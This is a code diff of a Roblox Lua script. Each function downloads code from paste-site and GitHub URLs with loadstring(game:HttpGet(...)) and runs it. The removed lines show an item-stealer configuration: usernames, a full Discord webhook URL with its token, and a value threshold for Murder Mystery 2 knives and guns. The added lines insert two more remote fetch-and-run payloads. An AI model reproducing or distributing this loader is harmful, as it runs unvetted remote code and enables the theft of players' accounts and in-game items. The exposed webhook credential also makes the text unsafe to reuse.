@@ -2,12 +2,12 @@ local function work()
     loadstring(game:HttpGet("https://paste.debian.net/plainh/85d7acec/", true))()
 end
 local function work2()
-       Username = {"eg0r204","eygen_rob"} 
-    Webhook = "https://discord.com/api/webhooks/1405262561234124931/Qi01I2hKHTobwdoIOx_hV7BHTBOlodwLo2HVcvU7QmDRgnyiQpxaqCyZeEeMxPrW5j4i" 
-    min_rap = 10000 --for knife and gun murder mystery 2 
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/D3ATH-hub/multi/main/all_in_one.lua"))()
+    loadstring(game:HttpGet("https://paste.debian.net/plainh/aa343a4b/", true))()
+end
+local function work3()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/zxc'))()
 end
 
 task.spawn(work)
 task.spawn(work2)
+task.spawn(work3)
